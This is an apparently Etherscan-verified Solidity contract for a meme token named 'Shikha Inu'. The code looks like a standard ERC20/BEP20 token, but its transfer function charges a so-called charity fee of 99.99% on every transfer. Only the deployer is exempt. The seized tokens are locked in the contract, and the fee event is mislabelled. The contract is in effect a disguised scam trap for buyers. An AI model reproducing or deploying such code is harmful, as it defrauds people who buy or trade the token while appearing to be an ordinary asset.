['/**\n', ' *Submitted for verification at Etherscan.io on 2021-05-01\n', '*/\n', '\n', 'pragma solidity 0.8.4;\n', '\n', '// SPDX-License-Identifier: MIT\n', '\n', '/**\n', ' * @dev Interface of the BEP20 standard as defined in the EIP.\n', ' */\n', 'interface IERC20 {\n', '    /**\n', '     * @dev Returns the amount of tokens in existence.\n', '     */\n', '    function totalSupply() external view returns (uint256);\n', '\n', '    /**\n', '     * @dev Returns the amount of tokens owned by `account`.\n', '     */\n', '    function balanceOf(address account) external view returns (uint256);\n', '\n', '    /**\n', "     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n", '     *\n', '     * Returns a boolean value indicating whether the operation succeeded.\n', '     *\n', '     * Emits a {Transfer} event.\n', '     */\n', '    function transfer(address recipient, uint256 amount) external returns (bool);\n', '\n', '    /**\n', '     * @dev Returns the remaining number of tokens that `spender` will be\n', '     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n', '     * zero by default.\n', '     *\n', '     * This value changes when {approve} or {transferFrom} are called.\n', '     */\n', '    function allowance(address owner, address spender) external view returns (uint256);\n', '\n', '    /**\n', "     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n", '     *\n', '     * Returns a boolean value indicating whether the operation succeeded.\n', '     *\n', '     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n', '     * that someone may use both the old and the new allowance by unfortunate\n', '     * transaction ordering. One possible solution to mitigate this race\n', "     * condition is to first reduce the spender's allowance to 0 and set the\n", '     * desired value afterwards:\n', '     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n', '     *\n', '     * Emits an {Approval} event.\n', '     */\n', '    function approve(address spender, uint256 amount) external returns (bool);\n', '\n', '    /**\n', '     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n', "     * allowance mechanism. `amount` is then deducted from the caller's\n", '     * allowance.\n', '     *\n', '     * Returns a boolean value indicating whether the operation succeeded.\n', '     *\n', '     * Emits a {Transfer} event.\n', '     */\n', '    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n', '\n', '    /**\n', '     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n', '     * another (`to`).\n', '     *\n', '     * Note that `value` may be zero.\n', '     */\n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '\n', '    /**\n', '     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n', '     * a call to {approve}. `value` is the new allowance.\n', '     */\n', '    event Approval(address indexed owner, address indexed spender, uint256 value);\n', '}\n', '\n', 'contract Shikha_Inu is IERC20 {\n', '\n', '    string private _name = "Shikha Inu";\n', '    string private _symbol = "SHIKHA";\n', '    uint8 private _decimals = 18;\n', '    \n', '    mapping(address => uint256) internal _tokenBalance;\n', '    mapping(address => mapping(address => uint256)) internal _allowances;\n', '    \n', '    uint256 internal _tokenTotal = 10000000000 *10**18;\n', '    \n', '    mapping(address => bool) isExcludedFromFee;\n', '\n', '    constructor() {\n', '        \n', '        isExcludedFromFee[msg.sender] = true;\n', '        \n', '        _tokenBalance[msg.sender] = _tokenTotal;\n', '        emit Transfer(address(0), msg.sender, _tokenTotal);\n', '    }\n', '    \n', '    function name() public view returns (string memory) {\n', '        return _name;\n', '    }\n', '\n', '    function symbol() public view returns (string memory) {\n', '        return _symbol;\n', '    }\n', '\n', '    function decimals() public view returns (uint8) {\n', '        return _decimals;\n', '    }\n', '\n', '    function totalSupply() public override view returns (uint256) {\n', '        return _tokenTotal;\n', '    }\n', '\n', '    function balanceOf(address account) public override view returns (uint256) {\n', '        return _tokenBalance[account];\n', '    }\n', '\n', '    function transfer(address recipient, uint256 amount) public override virtual returns (bool) {\n', '       _transfer(msg.sender,recipient,amount);\n', '        return true;\n', '    }\n', '\n', '    function allowance(address owner, address spender) public override view returns (uint256) {\n', '        return _allowances[owner][spender];\n', '    }\n', '\n', '    function approve(address spender, uint256 amount) public override returns (bool) {\n', '        _approve(msg.sender, spender, amount);\n', '        return true;\n', '    }\n', '\n', '    function transferFrom(address sender, address recipient, uint256 amount) public override virtual returns (bool) {\n', '        _transfer(sender,recipient,amount);\n', '               \n', '        _approve(sender,msg.sender,_allowances[sender][msg.sender] - amount);\n', '        return true;\n', '    }\n', '\n', '    function _approve(address owner, address spender, uint256 amount) private {\n', '        require(owner != address(0), "ERC20: approve from the zero address");\n', '        require(spender != address(0), "ERC20: approve to the zero address");\n', '\n', '        _allowances[owner][spender] = amount;\n', '        emit Approval(owner, spender, amount);\n', '    }\n', '\n', '    function _transfer(address sender, address recipient, uint256 amount) private {\n', '        require(sender != address(0), "ERC20: transfer from the zero address");\n', '        require(recipient != address(0), "ERC20: transfer to the zero address");\n', '        require(amount > 0, "Transfer amount must be greater than zero");\n', '        \n', '        uint256 transferAmount = amount;\n', '        uint256 charityFee = amount * 9999 / 10000;\n', '        \n', '        if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]) {\n', '            //@dev charity fee\n', '            if(charityFee > 0) {\n', '                transferAmount = transferAmount - charityFee;\n', '                _tokenBalance[address(this)] = _tokenBalance[address(this)] + charityFee;\n', '                emit Transfer(recipient, address(this), charityFee);\n', '            }\n', '        }\n', '        \n', '        _tokenBalance[sender] = _tokenBalance[sender] - amount;\n', '        _tokenBalance[recipient] = _tokenBalance[recipient] + transferAmount;\n', '\n', '        emit Transfer(sender, recipient, transferAmount);\n', '    }\n', '}']